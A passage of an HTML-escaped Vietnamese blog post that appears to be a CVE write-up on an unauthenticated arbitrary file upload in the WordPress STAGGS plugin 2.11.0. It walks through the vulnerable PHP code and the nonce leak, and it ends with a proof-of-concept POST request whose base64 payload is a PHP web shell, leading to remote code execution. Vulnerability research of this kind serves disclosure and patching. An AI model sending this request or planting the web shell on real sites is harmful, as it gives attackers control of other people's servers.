Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/staggs/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress STAGGS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;STAGGS&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.11.0&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.12.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra trong h√†m &lt;code&gt;store_final_product_image()&lt;/code&gt; thu·ªôc file &lt;code&gt;/wp-content/plugins/staggs/includes/staggs-functions.php&lt;/code&gt; do kh√¥ng x√°c th·ª±c &lt;strong&gt;file type&lt;/strong&gt; tr∆∞·ªõc khi upload&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/diff.png&#34; title=&#34;X√°c th·ª±c file type&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Validate File Type&lt;/h2&gt;&lt;p&gt;X√°c th·ª±c file type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/diff.png&#39; alt=&#34;Validate File Type&#34; height=&#34;1200&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;X√°c th·ª±c file type&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng while list, ch·ªâ ch·∫•p nh·∫≠n c√°c lo·∫°i file: &lt;code&gt;png&lt;/code&gt;,&lt;code&gt;jpg&lt;/code&gt;,&lt;code&gt;jpeg&lt;/code&gt;,&lt;code&gt;gif&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook d√†nh cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p (&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_staggs_get_configuration_form_urls&amp;#39;, &amp;#39;staggs_get_configuration_form_urls_ajax&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy c·∫≠p endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=staggs_get_configuration_form_urls&lt;/code&gt; th√¨ callback &lt;code&gt;staggs_get_configuration_form_urls_ajax&lt;/code&gt; ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function staggs_get_configuration_form_urls_ajax() {&#xA;  $response = array();&#xA;  if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( $_REQUEST[&amp;#39;nonce&amp;#39;], &amp;#39;sgg_ajax_nonce&amp;#39; ) ) {&#xA;    echo json_encode( $response );&#xA;    die();&#xA;  }&#xA;  ...&#xA;  if ( isset( $_POST[&amp;#39;image_id&amp;#39;] ) ) {&#xA;    $image_name = staggs_sanitize_title( get_the_title( $_POST[&amp;#39;image_id&amp;#39;] ) ); // image name based on product title.&#xA;    $image_url  = store_final_product_image( $image_name, $_POST[&amp;#39;image&amp;#39;], $_POST[&amp;#39;values&amp;#39;], true );&#xA;&#xA;    $response[&amp;#39;image_url&amp;#39;] = $image_url;&#xA;  }&#xA;  ...&#xA;  echo json_encode( $response );&#xA;  die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y ki·ªÉm tra &lt;code&gt;nonce&lt;/code&gt; t·ª´ request, n·∫øu n√≥ kh√¥ng t·ªìn t·∫°i ho·∫∑c kh√¥ng h·ª£p l·ªá th√¨ tr·∫£ v·ªÅ response r·ªóng&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;Khi t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;sgg_ajax_nonce&lt;/code&gt;, ta th·∫•y &lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c t·∫°o b·∫±ng key &lt;code&gt;AJAX_NONCE&lt;/code&gt; v√† c√≥ comment &lt;code&gt;// image name based on product title.&lt;/code&gt; li√™n quan ƒë·∫øn product. Do ph·∫ßn n√†y kh√¥ng y√™u c·∫ßu x√°c th·ª±c, c√≥ th·ªÉ ƒë√¢y l√† c∆° ch·∫ø ph·ª•c v·ª• vi·ªác hi·ªÉn th·ªã product cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p, v√† &lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o m√£ ngu·ªìn.&#xA;Khi th·ª≠ t√≠nh nƒÉng t·∫°o product c·ªßa plugin, h·ªá th·ªëng t·∫°o m·ªôt post m√† ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p v·∫´n c√≥ th·ªÉ truy c·∫≠p.&#xA;&lt;code&gt;nonce&lt;/code&gt; n√†y xu·∫•t hi·ªán trong m√£ ngu·ªìn tr·∫£ v·ªÅ khi truy c·∫≠p product v·ª´a ƒë∆∞·ª£c t·∫°o.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce_create.png&#34; title=&#34;C√°ch nonce ƒë∆∞·ª£c t·∫°o&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;C√°ch nonce ƒë∆∞·ª£c t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;327&#34; width=&#34;1369&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°ch nonce ƒë∆∞·ª£c t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/product.png&#34; title=&#34;T·∫°o Product b·∫±ng plugin&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/product.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Product&lt;/h2&gt;&lt;p&gt;T·∫°o Product b·∫±ng plugin&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/product.png&#39; alt=&#34;Create Product&#34; height=&#34;685&#34; width=&#34;1039&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o Product b·∫±ng plugin&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce.png&#34; title=&#34;Nonce l·∫•y t·ª´ response&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce l·∫•y t·ª´ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;682&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce l·∫•y t·ª´ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;N·∫øu &lt;code&gt;nonce&lt;/code&gt; h·ª£p l·ªá, ti·∫øp t·ª•c ki·ªÉm tra &lt;code&gt;$_POST[&#39;image_id&#39;]&lt;/code&gt; c√≥ t·ªìn t·∫°i hay kh√¥ng, n·∫øu c√≥:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y &lt;code&gt;image name&lt;/code&gt; t·ª©c t√™n c·ªßa &lt;strong&gt;product title&lt;/strong&gt; (theo m√¥ t·∫£: &lt;code&gt;// image name based on product title.&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;store_final_product_image()&lt;/code&gt; ƒë·ªÉ l∆∞u ·∫£nh v√† l·∫•y URL tr·∫£ v·ªÅ&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ ph·∫£n h·ªìi JSON ch·ª©a &lt;code&gt;image_url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function store_final_product_image( $imagename, $data, $options, $main_image = true) {&#xA;  if ( preg_match( &amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type ) ) {&#xA;    // Valid base64 image.&#xA;    $data = substr( $data, strpos($data, &amp;#39;,&amp;#39;) &amp;#43; 1 );&#xA;    $type = strtolower( $type[1] ); // jpg, png, gif&#xA;&#xA;    $data = str_replace( &amp;#39; &amp;#39;, &amp;#39;&amp;#43;&amp;#39;, $data );&#xA;    $data = base64_decode($data);&#xA;  &#xA;    if ( $data === false ) {&#xA;      throw new \Exception(&amp;#39;Image decode failed. Try again.&amp;#39;);&#xA;    }&#xA;  } &#xA;  ...&#xA;  $upload_dir = wp_get_upload_dir();&#xA;  $base_dir   = $upload_dir[&amp;#39;basedir&amp;#39;];&#xA;&#xA;  // Allow different location.&#xA;  $save_path  = apply_filters( &amp;#39;staggs_image_save_dir&amp;#39;, $base_dir . &amp;#39;/staggs&amp;#39; );&#xA;  if ( ! file_exists( $save_path ) ) {&#xA;    mkdir( $save_path, 0777, true );&#xA;  }&#xA;  if ( $main_image ) {&#xA;    // Main product image.&#xA;    if ( is_array( $options ) &amp;amp;&amp;amp; count( $options ) &amp;gt; 0 ) {&#xA;      $filename = $imagename . &amp;#39;-&amp;#39; . md5( wp_json_encode( $options ) ) . &amp;#39;.&amp;#39; . $type;&#xA;    } else {&#xA;      $filename = $imagename . &amp;#39;.&amp;#39; . $type;&#xA;    }&#xA;  } &#xA;  ...&#xA;  // Always override in case something went wrong earlier&#xA;  file_put_contents( $save_path . &amp;#34;/{$filename}&amp;#34;, $data );&#xA;  $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );&#xA;  return $image_path_url . &amp;#34;/{$filename}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;L·ªánh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;preg_match(&amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;D√πng ƒë·ªÉ ki·ªÉm tra xem bi·∫øn &lt;code&gt;$data&lt;/code&gt; c√≥ ph·∫£i l√† chu·ªói ·∫£nh ·ªü ƒë·ªãnh d·∫°ng &lt;strong&gt;Base64 Data URI&lt;/strong&gt; &lt;em&gt;hay kh√¥ng.&lt;/em&gt;&#xA;C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;^data:image\/&lt;/code&gt; ‚Üí chu·ªói ph·∫£i b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;data:image/&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;(.*)&lt;/code&gt; ‚Üí l·∫•y ph·∫ßn ƒë·ªãnh d·∫°ng ·∫£nh (v√≠ d·ª•: &lt;code&gt;png&lt;/code&gt;, &lt;code&gt;jpeg&lt;/code&gt;, &lt;code&gt;gif&lt;/code&gt;, ‚Ä¶)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;;base64,&lt;/code&gt; ‚Üí ti·∫øp theo ph·∫£i c√≥ chu·ªói &lt;code&gt;;base64,&lt;/code&gt; (b√°o hi·ªáu d·ªØ li·ªáu ·∫£nh ƒë∆∞·ª£c m√£ h√≥a Base64)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu kh·ªõp, m·∫£ng &lt;code&gt;$type&lt;/code&gt; s·∫Ω ch·ª©a th√¥ng tin ƒë·ªãnh d·∫°ng ·∫£nh, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$type[1] = &amp;#39;png&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu kh√¥ng kh·ªõp, t·ª©c &lt;code&gt;$data&lt;/code&gt; &lt;strong&gt;kh√¥ng ph·∫£i l√† d·ªØ li·ªáu ·∫£nh Base64 h·ª£p l·ªá&lt;/strong&gt;, h√†m tr·∫£ v·ªÅ &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau ƒë√≥ &lt;code&gt;$type&lt;/code&gt; ƒë∆∞·ª£c g√°n gi√° tr·ªã c·ªßa &lt;code&gt;$type[1]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ta c√≥ th·ªÉ truy·ªÅn &lt;code&gt;$data=data:image/php;base64...&lt;/code&gt; ƒë·ªÉ &lt;code&gt;$type[1] =&#39;php&#39;&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;if ( is_array( $options ) &amp;amp;&amp;amp; count( $options ) &amp;gt; 0 ) {&#xA;  $filename = $imagename . &amp;#39;-&amp;#39; . md5( wp_json_encode( $options ) ) . &amp;#39;.&amp;#39; . $type;&#xA;} else {&#xA;  $filename = $imagename . &amp;#39;.&amp;#39; . $type;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;code&gt;$options&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c truy·ªÅn th√¨ &lt;code&gt;$filename&lt;/code&gt; s·∫Ω c√≥ d·∫°ng &lt;code&gt;product_title.$type&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng, file ƒë∆∞·ª£c l∆∞u b·∫±ng h√†m &lt;code&gt;file_put_contents()&lt;/code&gt; v√† tr·∫£ v·ªÅ URL ƒë·∫´n t·ªõi n√≥&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;file_put_contents( $save_path . &amp;#34;/{$filename}&amp;#34;, $data );&#xA;$image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );&#xA;return $image_path_url . &amp;#34;/{$filename}&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls&amp;#34;] --&amp;gt; B[&amp;#34;staggs_get_configuration_form_urls_ajax()&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;wp_verify_nonce() valid?&amp;#34;}&#xA;C -- No --&amp;gt; Z[&amp;#34;Return empty JSON&amp;#34;]&#xA;C -- Yes --&amp;gt; D{&amp;#34;isset($_POST[&amp;#39;image_id&amp;#39;])?&amp;#34;}&#xA;D -- No --&amp;gt; Z&#xA;D -- Yes --&amp;gt; E[&amp;#34;store_final_product_image($image_name, $_POST[&amp;#39;image&amp;#39;], $_POST[&amp;#39;values&amp;#39;], true)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;preg_match(&amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type) ?&amp;#34; }&#xA;F -- No --&amp;gt; Z&#xA;F -- Yes --&amp;gt; G[&amp;#34;$type = strtolower($type[1]); base64_decode($data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Uploaded file (extension from $type) accessible ‚Üí Arbitrary File Upload / RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;L·∫•y nonce t·ª´ m√£ ngu·ªìn tr·∫£ v·ªÅ&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i POST request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=staggs_get_configuration_form_urls&amp;amp;nonce=f281c84283&amp;amp;image_id=1&amp;amp;image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi &lt;code&gt;PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==&lt;/code&gt; m√£ h√≥a base64 c·ªßa &lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;quot;cmd&amp;quot;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/request.png&#34; title=&#34;Request v·ªõi Web Shell payload&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request v·ªõi Web Shell payload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/request.png&#39; alt=&#34;Request&#34; height=&#34;413&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request v·ªõi Web Shell payload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Truy c·∫≠p URL tr·∫£ v·ªÅ v√† RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/result.png&#39; alt=&#34;Result&#34; height=&#34;589&#34; 